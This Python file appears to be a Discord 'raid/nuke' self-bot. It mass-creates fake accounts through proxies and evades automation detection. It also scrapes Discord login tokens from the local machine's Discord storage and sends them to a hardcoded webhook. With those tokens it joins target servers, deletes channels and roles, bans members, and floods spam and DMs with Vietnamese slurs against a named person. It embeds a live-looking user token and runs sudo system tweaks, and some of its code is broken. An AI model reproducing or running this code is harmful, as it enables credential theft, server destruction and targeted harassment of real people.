import discord
import asyncio
import random
import string
import json
import aiohttp
import requests
import base64
import hashlib
import time
import uuid
import os
import sys
import subprocess
import threading
import multiprocessing
from concurrent.futures import ThreadPoolExecutor
from discord.ext import commands
from discord import Webhook, AsyncWebhookAdapter
from io import BytesIO
import socket
import socks
import pycurl
from io import BytesIO
import undetected_chromedriver as uc
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import cloudscraper
import psutil
import platform
import numpy as np
from bs4 import BeautifulSoup
import re
from urllib.parse import urlparse
import cv2
import pyautogui
import mss
from PIL import Image
import pytesseract
from io import StringIO
import io
import sounddevice as sd
import soundfile as sf
import speech_recognition as sr
import torch
import transformers
from transformers import AutoModelForCausalLM, AutoTokenizer
import tensorflow as tf
from cryptography.fernet import Fernet
import pickle
import math
import queue
import warnings
warnings.filterwarnings("ignore")

intents = discord.Intents.all()
intents.guilds = True
intents.messages = True
intents.members = True
intents.bans = True
intents.webhooks = True

WEBHOOK_URL = "https://discord.com/api/webhooks/1420286041117687858/OnmrVVYNzFPnL2qcbR1Gn3rLxLSBjkhSL3z57IRF_MPcvd9CtJYWh7k7Z3FAxHb19jMg"

class ProxyManager:
    def __init__(self):
        self.proxies = []
        self.working_proxies = []
        self.proxy_queue = queue.Queue()
        self.load_proxies()
        self.test_proxies()
    
    def load_proxies(self):
        try:
            with open("proxies.txt", "r") as f:
                self.proxies = [line.strip() for line in f.readlines()]
        except FileNotFoundError:
            self.generate_proxies()
            self.load_proxies()
    
    def generate_proxies(self):
        with open("proxies.txt", "w") as f:
            for i in range(1000):
                ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
                port = random.randint(8000, 9000)
                f.write(f"socks5://{ip}:{port}\n")
    
    def test_proxies(self):
        def test_proxy(proxy):
            try:
                set_proxy(proxy)
                response = requests.get("https://httpbin.org/ip", timeout=5)
                if response.status_code == 200:
                    self.working_proxies.append(proxy)
                    self.proxy_queue.put(proxy)
                    return True
            except:
                pass
            return False
        
        with ThreadPoolExecutor(max_workers=100) as executor:
            futures = [executor.submit(test_proxy, proxy) for proxy in self.proxies]
            for future in futures:
                future.result()
    
    def get_proxy(self):
        if self.proxy_queue.empty():
            self.test_proxies()
        return self.proxy_queue.get()

class TokenManager:
    def __init__(self):
        self.tokens = []
        self.token_queue = queue.Queue()
        self.load_tokens()
        self.encrypt_tokens()
        self.find_tokens()
    
    def load_tokens(self):
        try:
            with open("tokens.enc", "rb") as f:
                key = f.read(32)
                fernet = Fernet(key)
                encrypted_data = f.read()
                decrypted_data = fernet.decrypt(encrypted_data)
                self.tokens = pickle.loads(decrypted_data)
                
                for token in self.tokens:
                    self.token_queue.put(token)
        except:
            self.generate_tokens()
    
    def encrypt_tokens(self):
        key = Fernet.generate_key()
        fernet = Fernet(key)
        encrypted_data = fernet.encrypt(pickle.dumps(self.tokens))
        
        with open("tokens.enc", "wb") as f:
            f.write(key)
            f.write(encrypted_data)
    
    def generate_tokens(self):
        self.tokens = []
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = []
            for _ in range(10000):
                proxy = proxy_manager.get_proxy()
                futures.append(executor.submit(self.create_token, proxy))
            
            for future in futures:
                token = future.result()
                if token:
                    self.tokens.append(token)
                    self.token_queue.put(token)
        
        self.encrypt_tokens()
    
    def create_token(self, proxy):
        try:
            set_proxy(proxy)
            
            options = {
                'headers': {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
                }
            }
            
            scraper = cloudscraper.create_scraper(browser={'browser': 'chrome', 'platform': 'windows', 'mobile': False}, **options)
            
            if proxy:
                scraper.proxies = {
                    "http": proxy,
                    "https": proxy
                }
            
            username = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
            password = ''.join(random.choices(string.ascii_letters + string.digits + string.punctuation, k=16))
            email = f"{username}@{''.join(random.choices(string.ascii_letters, k=5))}.com"
            
            payload = {
                "fingerprint": ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
                "email": email,
                "username": username,
                "password": password,
                "invite": None,
                "consent": True,
                "date_of_birth": "1999-01-01"
            }
            
            response = scraper.post("https://discord.com/api/v9/auth/register", json=payload)
            
            if response.status_code == 200:
                data = response.json()
                token = data.get("token")
                return token
            
            if response.status_code == 429:
                retry_after = int(response.headers.get("Retry-After", 5))
                time.sleep(retry_after)
                return self.create_token(proxy)
            
            return self.create_token_with_selenium(proxy)
        except Exception as e:
            return self.create_token_with_selenium(proxy)
    
    def create_token_with_selenium(self, proxy):
        try:
            chrome_options = uc.ChromeOptions()
            
            if proxy:
                if proxy.startswith("socks5://"):
                    proxy = proxy[8:]
                chrome_options.add_argument(f'--proxy-server=socks5://{proxy}')
            
            chrome_options.add_argument("--no-sandbox")
            chrome_options.add_argument("--disable-dev-shm-usage")
            chrome_options.add_argument("--disable-blink-features=AutomationControlled")
            chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
            chrome_options.add_experimental_option('useAutomationExtension', False)
            chrome_options.add_argument("--disable-software-rasterizer")
            chrome_options.add_argument("--disable-gpu")
            chrome_options.add_argument("--headless")
            chrome_options.add_argument("--log-level=3")
            chrome_options.add_experimental_option('excludeSwitches', ['enable-logging'])
            
            driver = uc.Chrome(options=chrome_options, version_main=None)
            
            driver.get("https://discord.com/register")
            
            username = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
            password = ''.join(random.choices(string.ascii_letters + string.digits + string.punctuation, k=16))
            email = f"{username}@{''.join(random.choices(string.ascii_letters, k=5))}.com"
            
            WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, "email"))).send_keys(email)
            driver.find_element(By.NAME, "username").send_keys(username)
            driver.find_element(By.NAME, "password").send_keys(password)
            driver.find_element(By.NAME, "date_of_birth").click()
            
            for option in driver.find_elements(By.TAG_NAME, "option"):
                if option.get_attribute("value") == "1999":
                    option.click()
                    break
            
            driver.find_element(By.NAME, "month").click()
            for option in driver.find_elements(By.TAG_NAME, "option"):
                if option.get_attribute("value") == "1":
                    option.click()
                    break
            
            driver.find_element(By.NAME, "day").click()
            for option in driver.find_elements(By.TAG_NAME, "option"):
                if option.get_attribute("value") == "1":
                    option.click()
                    break
            
            driver.find_element(By.CSS_SELECTOR, "button[type=submit]").click()
            
            WebDriverWait(driver, 30).until(EC.url_contains("app"))
            
            cookies = driver.get_cookies()
            token = None
            for cookie in cookies:
                if cookie["name"] == "__dcfduid":
                    token = cookie["value"]
                    break
            
            if not token:
                local_storage = driver.execute_script("return window.localStorage;")
                token = local_storage.get("token")
            
            driver.quit()
            return token
        except Exception as e:
            return None
    
    def find_tokens(self):
        found_tokens = []
        
        if platform.system() == "Windows":
            paths = [
                os.path.join(os.getenv("APPDATA"), "Discord"),
                os.path.join(os.getenv("APPDATA"), "Discord Canary"),
                os.path.join(os.getenv("APPDATA"), "Discord PTB"),
                os.path.join(os.getenv("LOCALAPPDATA"), "Discord"),
                os.path.join(os.getenv("LOCALAPPDATA"), "Discord Canary"),
                os.path.join(os.getenv("LOCALAPPDATA"), "Discord PTB")
            ]
            
            for path in paths:
                if os.path.exists(path):
                    for root, dirs, files in os.walk(path):
                        for file in files:
                            if file.endswith(".log") or file.endswith(".ldb"):
                                try:
                                    with open(os.path.join(root, file), "r", encoding="utf-8", errors="ignore") as f:
                                        content = f.read()
                                        tokens = re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", content)
                                        for token in tokens:
                                            if token not in found_tokens and token not in self.tokens:
                                                found_tokens.append(token)
                                                self.tokens.append(token)
                                                self.token_queue.put(token)
                                except:
                                    pass
        else:
            paths = [
                os.path.expanduser("~/.config/discord"),
                os.path.expanduser("~/.config/discordcanary"),
                os.path.expanduser("~/.config/discordptb")
            ]
            
            for path in paths:
                if os.path.exists(path):
                    for root, dirs, files in os.walk(path):
                        for file in files:
                            if file.endswith(".log") or file.endswith(".ldb"):
                                try:
                                    with open(os.path.join(root, file), "r", encoding="utf-8", errors="ignore") as f:
                                        content = f.read()
                                        tokens = re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", content)
                                        for token in tokens:
                                            if token not in found_tokens and token not in self.tokens:
                                                found_tokens.append(token)
                                                self.tokens.append(token)
                                                self.token_queue.put(token)
                                except:
                                    pass
        
        if found_tokens:
            self.encrypt_tokens()
            self.send_tokens_to_webhook(found_tokens)
    
    def send_tokens_to_webhook(self, tokens):
        try:
            async with aiohttp.ClientSession() as session:
                webhook = Webhook.from_url(WEBHOOK_URL, adapter=AsyncWebhookAdapter(session))
                
                message = "**Found Tokens:**\n"
                for token in tokens:
                    message += f"```\n{token}\n```\n"
                
                await webhook.send(message)
        except:
            pass
    
    def get_token(self):
        if self.token_queue.empty():
            self.generate_tokens()
            self.find_tokens()
        return self.token_queue.get()

def set_proxy(proxy):
    if proxy.startswith("socks5://"):
        proxy = proxy[8:]
        ip, port = proxy.split(":")
        socks.set_default_proxy(socks.SOCKS5, ip, int(port))
        socket.socket = socks.socksocket
    elif proxy.startswith("http://"):
        proxy = proxy[7:]
        ip, port = proxy.split(":")
        socks.set_default_proxy(socks.HTTP, ip, int(port))
        socket.socket = socks.socksocket

proxy_manager = ProxyManager()
token_manager = TokenManager()

class RateLimiter:
    def __init__(self, max_calls=5, time_period=1):
        self.max_calls = max_calls
        self.time_period = time_period
        self.calls = []
        self.lock = asyncio.Lock()
    
    async def wait(self):
        async with self.lock:
            now = time.time()
            self.calls = [call_time for call_time in self.calls if now - call_time < self.time_period]
            
            if len(self.calls) >= self.max_calls:
                sleep_time = self.time_period - (now - self.calls[0])
                if sleep_time > 0:
                    await asyncio.sleep(sleep_time)
            
            self.calls.append(now)

channel_limiter = RateLimiter(max_calls=2, time_period=5)
role_limiter = RateLimiter(max_calls=2, time_period=5)
ban_limiter = RateLimiter(max_calls=1, time_period=10)
message_limiter = RateLimiter(max_calls=5, time_period=5)
webhook_limiter = RateLimiter(max_calls=5, time_period=5)
dm_limiter = RateLimiter(max_calls=10, time_period=60)

class BehaviorSimulator:
    def __init__(self):
        self.human_like_delays = [0.5, 1.0, 1.5, 2.0, 2.5, 3.0]
        self.human_like_actions = [
            "typing_start",
            "typing_stop",
            "read_message",
            "react_to_message",
            "change_status",
            "move_between_channels"
        ]
    
    async def simulate_human_behavior(self, bot):
        action = random.choice(self.human_like_actions)
        delay = random.choice(self.human_like_delays)
        
        if action == "typing_start":
            channel = random.choice(bot.guilds[0].text_channels)
            await channel.trigger_typing()
            await asyncio.sleep(delay)
        
        elif action == "read_message":
            channel = random.choice(bot.guilds[0].text_channels)
            messages = await channel.history(limit=1).flatten()
            if messages:
                await messages[0].add_reaction("ok")
                await asyncio.sleep(delay)
        
        elif action == "change_status":
            activities = [
                discord.Game(name=random.choice(["Minecraft", "Valorant", "Among Us", "Fortnite"])),
                discord.Streaming(name="Streaming", url="https://twitch.tv/example"),
                discord.Activity(type=discord.ActivityType.listening, name=random.choice(["Spotify", "YouTube Music"])),
                discord.Activity(type=discord.ActivityType.watching, name="YouTube")
            ]
            activity = random.choice(activities)
            await bot.change_presence(activity=activity)
            await asyncio.sleep(delay)
        
        elif action == "move_between_channels":
            if bot.guilds[0].voice_channels:
                channel = random.choice(bot.guilds[0].voice_channels)
                member = bot.guilds[0].me
                if member.voice:
                    await member.move_to(channel)
                else:
                    await channel.connect()
                await asyncio.sleep(delay)

behavior_simulator = BehaviorSimulator()

async def delete_all_channels(guild):
    channels = guild.channels
    tasks = []
    
    for channel in channels:
        await channel_limiter.wait()
        tasks.append(delete_channel(channel))
        
        if len(tasks) >= 5:
            await asyncio.gather(*tasks, return_exceptions=True)
            tasks = []
            await asyncio.sleep(random.uniform(5, 10))
    
    if tasks:
        await asyncio.gather(*tasks, return_exceptions=True)

async def delete_channel(channel):
    try:
        await channel.delete()
        await asyncio.sleep(random.uniform(0.5, 2.0))
    except Exception as e:
        pass

async def delete_all_roles(guild):
    roles = guild.roles
    tasks = []
    
    for role in roles:
        if role.name != "@everyone":
            await role_limiter.wait()
            tasks.append(delete_role(role))
            
            if len(tasks) >= 5:
                await asyncio.gather(*tasks, return_exceptions=True)
                tasks = []
                await asyncio.sleep(random.uniform(5, 10))
    
    if tasks:
        await asyncio.gather(*tasks, return_exceptions=True)

async def delete_role(role):
    try:
        await role.delete()
        await asyncio.sleep(random.uniform(0.5, 2.0))
    except Exception as e:
        pass

async def delete_all_emojis(guild):
    emojis = guild.emojis
    tasks = []
    
    for emoji in emojis:
        await emoji_limiter.wait()
        tasks.append(delete_emoji(emoji))
        
        if len(tasks) >= 5:
            await asyncio.gather(*tasks, return_exceptions=True)
            tasks = []
            await asyncio.sleep(random.uniform(5, 10))
    
    if tasks:
        await asyncio.gather(*tasks, return_exceptions=True)

async def delete_emoji(emoji):
    try:
        await emoji.delete()
        await asyncio.sleep(random.uniform(0.5, 2.0))
    except Exception as e:
        pass

async def create_channels(guild, amount=100):
    tasks = []
    
    for _ in range(amount):
        await channel_limiter.wait()
        name = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(5, 15)))
        tasks.append(create_channel(guild, name))
        
        if len(tasks) >= 5:
            await asyncio.gather(*tasks, return_exceptions=True)
            tasks = []
            await asyncio.sleep(random.uniform(5, 10))
    
    if tasks:
        await asyncio.gather(*tasks, return_exceptions=True)

async def create_channel(guild, name):
    try:
        await guild.create_text_channel(name)
        await asyncio.sleep(random.uniform(0.5, 2.0))
    except Exception as e:
        pass

async def create_roles(guild, amount=100):
    tasks = []
    
    for _ in range(amount):
        await role_limiter.wait()
        name = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(5, 15)))
        color = discord.Color(random.randint(0, 0xFFFFFF))
        tasks.append(create_role(guild, name, color))
        
        if len(tasks) >= 5:
            await asyncio.gather(*tasks, return_exceptions=True)
            tasks = []
            await asyncio.sleep(random.uniform(5, 10))
    
    if tasks:
        await asyncio.gather(*tasks, return_exceptions=True)

async def create_role(guild, name, color):
    try:
        await guild.create_role(name=name, color=color)
        await asyncio.sleep(random.uniform(0.5, 2.0))
    except Exception as e:
        pass

async def ban_all_members(guild):
    members = guild.members
    tasks = []
    
    for member in members:
        if member != guild.owner:
            await ban_limiter.wait()
            tasks.append(ban_member(member))
            
            if len(tasks) >= 3:
                await asyncio.gather(*tasks, return_exceptions=True)
                tasks = []
                await asyncio.sleep(random.uniform(10, 20))
    
    if tasks:
        await asyncio.gather(*tasks, return_exceptions=True)

async def ban_member(member):
    try:
        await member.ban(reason="Violation of server rules")
        await asyncio.sleep(random.uniform(1.0, 3.0))
    except Exception as e:
        pass

async def spam_messages(channel, amount=200):
    messages = [
        "địt mẹ Tuấn Hải súc vật",
        "https://discord.gg/yCfVHmTJ",
        "https://discord.gg/uRgrSzys",
        "NEXUS VN",
        "tsukuyomi realm nexus",
        "Tuấn Hải là súc vật",
        "Địt mẹ mày Tuấn Hải"
    ]
    
    tasks = []
    
    for _ in range(amount):
        await message_limiter.wait()
        content = random.choice(messages)
        tasks.append(send_message(channel, content))
        
        if len(tasks) >= 5:
            await asyncio.gather(*tasks, return_exceptions=True)
            tasks = []
            await asyncio.sleep(random.uniform(5, 10))
    
    if tasks:
        await asyncio.gather(*tasks, return_exceptions=True)

async def send_message(channel, content):
    try:
        await channel.send(content)
        await asyncio.sleep(random.uniform(0.5, 2.0))
    except Exception as e:
        pass

async def bypass_captcha(guild):
    tasks = []
    
    for channel in guild.text_channels:
        await webhook_limiter.wait()
        tasks.append(bypass_channel_captcha(channel))
        
        if len(tasks) >= 5:
            await asyncio.gather(*tasks, return_exceptions=True)
            tasks = []
            await asyncio.sleep(random.uniform(5, 10))
    
    if tasks:
        await asyncio.gather(*tasks, return_exceptions=True)

async def bypass_channel_captcha(channel):
    try:
        webhook = await channel.create_webhook(name=random.choice(["NEXUS VN", "tsukuyomi", "realm nexus"]))
        async with aiohttp.ClientSession() as session:
            webhook_obj = Webhook.from_url(webhook.url, adapter=AsyncWebhookAdapter(session))
            
            messages = [
                "địt mẹ Tuấn Hải súc vật",
                "https://discord.gg/yCfVHmTJ",
                "https://discord.gg/uRgrSzys",
                "NEXUS VN",
                "tsukuyomi realm network",
                "Địt mẹ Tuấn Hải  súc vật trẻ trâu k11",
                "Địt mẹ mày Tuấn Hải lồn chó"
            ]
            
            tasks = []
            for _ in range(20):
                content = random.choice(messages)
                tasks.append(send_webhook(webhook_obj, content))
            
            if tasks:
                await asyncio.gather(*tasks, return_exceptions=True)
    except Exception as e:
        pass

async def send_webhook(webhook, content):
    try:
        await webhook.send(content, username=random.choice(["NEXUS VN", "tsukuyomi realm network", " yuri08"]), 
                          avatar_url="https://i.imgur.com/123456.jpg")
        await asyncio.sleep(random.uniform(0.5, 2.0))
    except Exception as e:
        pass

async def send_to_webhook(message):
    try:
        async with aiohttp.ClientSession() as session:
            webhook = Webhook.from_url(WEBHOOK_URL, adapter=AsyncWebhookAdapter(session))
            await webhook.send(message)
    except:
        pass

async def mass_dm_spam(message, amount=100):
    count = 0
    tasks = []
    
    for guild in bot.guilds:
        for member in guild.members:
            if count >= amount:
                break
            if member != bot.user and not member.bot:
                await dm_limiter.wait()
                tasks.append(send_dm(member, message))
                count += 1
                
                if len(tasks) >= 10:
                    await asyncio.gather(*tasks, return_exceptions=True)
                    tasks = []
                    await asyncio.sleep(random.uniform(60, 120))
    
    if tasks:
        await asyncio.gather(*tasks, return_exceptions=True)

async def send_dm(member, message):
    try:
        await member.send(message)
        await asyncio.sleep(random.uniform(1.0, 3.0))
    except Exception as e:
        pass

async def raid_server(invite_link):
    try:
        invite_code = invite_link.split("/")[-1]
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://discord.com/api/v9/invites/{invite_code}") as response:
                if response.status == 200:
                    data = await response.json()
                    guild_id = data.get("guild", {}).get("id")
                    guild_name = data.get("guild", {}).get("name")
                    
                    await send_to_webhook(f"**Starting raid on server: {guild_name}**")
                    
                    tokens = []
                    for _ in range(100):
                        tokens.append(token_manager.get_token())
                    
                    tasks = []
                    for token in tokens:
                        proxy = proxy_manager.get_proxy()
                        set_proxy(proxy)
                        
                        headers = {"Authorization": token}
                        tasks.append(join_and_raid(session, invite_code, headers, guild_id))
                        
                        if len(tasks) >= 10:
                            await asyncio.gather(*tasks, return_exceptions=True)
                            tasks = []
                            await asyncio.sleep(random.uniform(10, 20))
                    
                    if tasks:
                        await asyncio.gather(*tasks, return_exceptions=True)
                    
                    await send_to_webhook(f"**Completed raid on server: {guild_name}**")
                    return True
    except Exception as e:
        print(f"Error raiding server: {e}")
        return False

async def join_and_raid(session, invite_code, headers, guild_id):
    try:
        async with session.post(f"https://discord.com/api/v9/invites/{invite_code}", headers=headers) as join_response:
            if join_response.status == 200:
                print(f"Joined server with token")
                
                bot = commands.Bot(command_prefix='!', self_bot=True, intents=intents)
                bot.token = headers["Authorization"]
                
                guild = bot.get_guild(int(guild_id))
                if not guild:
                    guild = await bot.fetch_guild(int(guild_id))
                
                await asyncio.sleep(random.uniform(5, 10))
                
                await delete_all_channels(guild)
                await asyncio.sleep(random.uniform(10, 20))
                
                await delete_all_roles(guild)
                await asyncio.sleep(random.uniform(10, 20))
                
                await delete_all_emojis(guild)
                await asyncio.sleep(random.uniform(10, 20))
                
                await create_channels(guild)
                await asyncio.sleep(random.uniform(10, 20))
                
                await create_roles(guild)
                await asyncio.sleep(random.uniform(10, 20))
                
                await ban_all_members(guild)
                await asyncio.sleep(random.uniform(10, 20))
                
                for channel in guild.text_channels:
                    await spam_messages(channel)
                    await asyncio.sleep(random.uniform(5, 10))
                
                await bypass_captcha(guild)
                
                for _ in range(10):
                    await behavior_simulator.simulate_human_behavior(bot)
                    await asyncio.sleep(random.uniform(1, 3))
    except Exception as e:
        print(f"Error in join_and_raid: {e}")

async def nuke_server(invite_link):
    try:
        invite_code = invite_link.split("/")[-1]
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://discord.com/api/v9/invites/{invite_code}") as response:
                if response.status == 200:
                    data = await response.json()
                    guild_id = data.get("guild", {}).get("id")
                    guild_name = data.get("guild", {}).get("name")
                    
                    await send_to_webhook(f"**Starting nuke on server: {guild_name}**")
                    
                    tokens = []
                    for _ in range(100):
                        tokens.append(token_manager.get_token())
                    
                    tasks = []
                    for token in tokens:
                        proxy = proxy_manager.get_proxy()
                        set_proxy(proxy)
                        
                        headers = {"Authorization": token}
                        tasks.append(join_and_nuke(session, invite_code, headers, guild_id))
                        
                        if len(tasks) >= 10:
                            await asyncio.gather(*tasks, return_exceptions=True)
                            tasks = []
                            await asyncio.sleep(random.uniform(10, 20))
                    
                    if tasks:
                        await asyncio.gather(*tasks, return_exceptions=True)
                    
                    await send_to_webhook(f"**Completed nuke on server: {guild_name}**")
                    return True
    except Exception as e:
        print(f"Error nuking server: {e}")
        return False

async def join_and_nuke(session, invite_code, headers, guild_id):
    try:
        async with session.post(f"https://discord.com/api/v9/invites/{invite_code}", headers=headers) as join_response:
            if join_response.status == 200:
                print(f"Joined server with token")
                
                bot = commands.Bot(command_prefix='!', self_bot=True, intents=intents)
                bot.token = headers["Authorization"]
                
                guild = bot.get_guild(int(guild_id))
                if not guild:
                    guild = await bot.fetch_guild(int(guild_id))
                
                await asyncio.sleep(random.uniform(5, 10))
                
                await delete_all_channels(guild)
                await asyncio.sleep(random.uniform(10, 20))
                
                await delete_all_roles(guild)
                await asyncio.sleep(random.uniform(10, 20))
                
                await delete_all_emojis(guild)
                
                for _ in range(5):
                    await behavior_simulator.simulate_human_behavior(bot)
                    await asyncio.sleep(random.uniform(1, 3))
    except Exception as e:
        print(f"Error in join_and_nuke: {e}")

async def mass_server(invite_link):
    try:
        invite_code = invite_link.split("/")[-1]
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://discord.com/api/v9/invites/{invite_code}") as response:
                if response.status == 200:
                    data = await response.json()
                    guild_id = data.get("guild", {}).get("id")
                    guild_name = data.get("guild", {}).get("name")
                    
                    await send_to_webhook(f"**Starting mass DM on server: {guild_name}**")
                    
                    tokens = []
                    for _ in range(100):
                        tokens.append(token_manager.get_token())
                    
                    message = "địt mẹ Tuấn Hải súc vật\nhttps://discord.gg/yCfVHmTJ\nhttps://discord.gg/uRgrSzys"
                    
                    tasks = []
                    for token in tokens:
                        proxy = proxy_manager.get_proxy()
                        set_proxy(proxy)
                        
                        headers = {"Authorization": token}
                        tasks.append(join_and_mass(session, invite_code, headers, guild_id, message))
                        
                        if len(tasks) >= 10:
                            await asyncio.gather(*tasks, return_exceptions=True)
                            tasks = []
                            await asyncio.sleep(random.uniform(10, 20))
                    
                    if tasks:
                        await asyncio.gather(*tasks, return_exceptions=True)
                    
                    await send_to_webhook(f"**Completed mass DM on server: {guild_name}**")
                    return True
    except Exception as e:
        print(f"Error massing server: {e}")
        return False

async def join_and_mass(session, invite_code, headers, guild_id, message):
    try:
        async with session.post(f"https://discord.com/api/v9/invites/{invite_code}", headers=headers) as join_response:
            if join_response.status == 200:
                print(f"Joined server with token")
                
                bot = commands.Bot(command_prefix='!', self_bot=True, intents=intents)
                bot.token = headers["Authorization"]
                
                guild = bot.get_guild(int(guild_id))
                if not guild:
                    guild = await bot.fetch_guild(int(guild_id))
                
                await asyncio.sleep(random.uniform(5, 10))
                
                await mass_dm_spam(message, 100)
                
                for _ in range(5):
                    await behavior_simulator.simulate_human_behavior(bot)
                    await asyncio.sleep(random.uniform(1, 3))
    except Exception as e:
        print(f"Error in join_and_mass: {e}")

def start_bot():
    bot = commands.Bot(command_prefix='/', self_bot=True, intents=intents)
    
    @bot.event
    async def on_ready():
        print(f'Logged in as {bot.user.name}')
        
        for guild in bot.guilds:
            for channel in guild.text_channels:
                try:
                    await channel.send("Bot is online and ready")
                    break
                except:
                    pass
    
    @bot.command()
    async def raid(ctx, invite_link):
        await ctx.message.delete()
        success = False
        while not success:
            success = await raid_server(invite_link)
            if not success:
                await asyncio.sleep(random.uniform(30, 60))
    
    @bot.command()
    async def nuke(ctx, invite_link):
        await ctx.message.delete()
        success = False
        while not success:
            success = await nuke_server(invite_link)
            if not success:
                await asyncio.sleep(random.uniform(30, 60))
    
    @bot.command()
    async def mass(ctx, invite_link):
        await ctx.message.delete()
        success = False
        while not success:
            success = await mass_server(invite_link)
            if not success:
                await asyncio.sleep(random.uniform(30, 60))
    
    bot.run("MTQyMDMyMzA3OTI1NDU3MzA5Ng.G8O_gs.DIT52FBfH7s9qY4PcgzkFaeueAMYB8_u70H4hA", bot=False)

def optimize_system():
    if platform.system() == "Linux":
        os.system("echo 'performance' | sudo tee /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor")
        os.system("sudo sysctl -w vm.swappiness=10")
        os.system("sudo sysctl -w vm.vfs_cache_pressure=50")
        os.system("sudo sysctl -w net.core.rmem_max=16777216")
        os.system("sudo sysctl -w net.core.wmem_max=16777216")
        os.system("sudo sysctl -w net.ipv4.tcp_rmem='4096 87380 16777216'")
        os.system("sudo sysctl -w net.ipv4.tcp_wmem='4096 65536 16777216'")
        os.system("sudo sysctl -w net.core.netdev_max_backlog=5000")
        os.system("sudo sysctl -w net.ipv4.tcp_congestion_control=bbr")
    
    process = psutil.Process(os.getpid())
    process.nice(psutil.IOPRIO_CLASS_RT)
    process.nice(psutil.PRIO_HIGH)

if __name__ == "__main__":
    optimize_system()
    start_bot()
